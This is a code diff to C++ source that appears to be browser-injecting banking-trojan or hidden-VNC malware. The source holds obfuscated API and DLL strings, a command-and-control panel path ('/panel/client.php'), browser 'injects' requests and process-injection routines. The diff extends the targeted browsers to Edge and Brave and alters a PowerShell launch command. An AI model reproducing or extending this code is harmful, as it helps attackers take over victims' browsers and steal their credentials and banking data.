@@ -166,10 +166,9 @@ namespace Funcs
 
 namespace Strs
 {
-   //server
    const char *host[128];
    const char *path;
-   //dlls
+
    const char *user32;
    const char *kernelBase;
    const char *kernel32;
@@ -189,7 +188,7 @@ namespace Strs
    wchar_t *wKernel32;
    wchar_t *wNtdll;
    wchar_t *wWininet;
-   //funcs
+
    const char *messageBoxA;
    const char *getWindowsDirectoryA;
    const char *wideCharToMultiByte;
@@ -355,7 +354,7 @@ namespace Strs
    const char *ldrGetProcedureAddress;
    const char *rtlFreeUnicodeString;
    const char *rtlCreateUserThread;                                                  
-   //misc
+
    const char *helloWorld;
    const char *exeExt;
    const char *fileDiv;
@@ -381,6 +380,8 @@ namespace Strs
    const char *explorerExe;
    const char *firefoxExe;
    const char *chromeExe;
+   const char *edgeExe;
+   const char *braveExe;
    const char *iexploreExe;
    const char* powershell;
    const char *injectsRequest;
@@ -480,12 +481,11 @@ namespace Strs
 
 void InitApi()
 {
-   //server
    Strs::host[0] = ENC_STR_A"127.0.0.1"END_ENC_STR;
    Strs::host[1] = 0;
 
    Strs::path = ENC_STR_A"/panel/client.php"END_ENC_STR;
-   //dlls
+
    Strs::user32     = ENC_STR_A"User32.dll"END_ENC_STR;
    Strs::kernel32   = ENC_STR_A"Kernel32.dll"END_ENC_STR;
    Strs::kernelBase = ENC_STR_A"KernelBase.dll"END_ENC_STR;
@@ -501,7 +501,6 @@ void InitApi()
    Strs::wininet    = ENC_STR_A"wininet.dll"END_ENC_STR;
    Strs::gdi32      = ENC_STR_A"gdi32.dll"END_ENC_STR;
 
-   //funcs
    Strs::messageBoxA               = ENC_STR_A"MessageBoxA"END_ENC_STR;
    Strs::getWindowsDirectoryA      = ENC_STR_A"GetWindowsDirectoryA"END_ENC_STR;
    Strs::wideCharToMultiByte       = ENC_STR_A"WideCharToMultiByte"END_ENC_STR;
@@ -673,7 +672,7 @@ void InitApi()
    Strs::rtlFreeUnicodeString         = ENC_STR_A"RtlFreeUnicodeString"END_ENC_STR;
    Strs::rtlCreateUserThread          = ENC_STR_A"RtlCreateUserThread"END_ENC_STR;
 
-   //misc
+
    Strs::helloWorld        = ENC_STR_A"Hello World"END_ENC_STR;
    Strs::exeExt            = ENC_STR_A".exe"END_ENC_STR;
    Strs::fileDiv           = ENC_STR_A"\\"END_ENC_STR;
@@ -703,7 +702,9 @@ void InitApi()
    Strs::firefoxExe         = ENC_STR_A"firefox.exe"END_ENC_STR;
    Strs::chromeExe          = ENC_STR_A"chrome.exe"END_ENC_STR;
    Strs::iexploreExe        = ENC_STR_A"iexplore.exe"END_ENC_STR;
-   Strs::powershell         = ENC_STR_A"powershell.exe"END_ENC_STR;
+   Strs::powershell         = ENC_STR_A"powershell -noexit -command \"[console]::windowwidth = 100;[console]::windowheight = 30; [console]::bufferwidth = [console]::windowwidth\""END_ENC_STR;
+   Strs::edgeExe            = ENC_STR_A"msedge.exe"END_ENC_STR;
+   Strs::braveExe           = ENC_STR_A"brave.exe"END_ENC_STR;
    Strs::injectsRequest     = ENC_STR_A"injects"END_ENC_STR;
    Strs::firefoxName        = ENC_STR_A"Firefox"END_ENC_STR;
    Strs::chromeName         = ENC_STR_A"Chrome"END_ENC_STR;
@@ -728,7 +729,7 @@ void InitApi()
    Strs::fc9  = ENC_STR_A"text/html"END_ENC_STR;
    Strs::fc10 = ENC_STR_A"\r\nLocation: "END_ENC_STR;
    Strs::fc11 = ENC_STR_A"\r\nContent-Length: "END_ENC_STR;
-   Strs::fc12 = ENC_STR_A"X-HeyThere: 5eYEp80n3hM"END_ENC_STR; //HtRGeyznv7k
+   Strs::fc12 = ENC_STR_A"X-HeyThere: 5eYEp80n3hM"END_ENC_STR;
   
    Strs::headersEnd = ENC_STR_A"\r\n\r\n"END_ENC_STR;
 
@@ -970,7 +971,6 @@ void InitApi()
    Funcs::pFindFirstFileA                 = (Types::T_FindFirstFile)                  Funcs::pGetProcAddress(hKernel32, Strs::findFirstFileA);
    Funcs::pFindNextFileA                  = (Types::T_FindNextFile)                   Funcs::pGetProcAddress(hKernel32, Strs::findNextFileA);
 
-   //wide strings
    Strs::wNtdll      = Utf8toUtf16(Strs::ntdll);
    Strs::wNspr4dll   = Utf8toUtf16(Strs::nspr4dll);
    Strs::wNss3dll    = Utf8toUtf16(Strs::nss3dll);
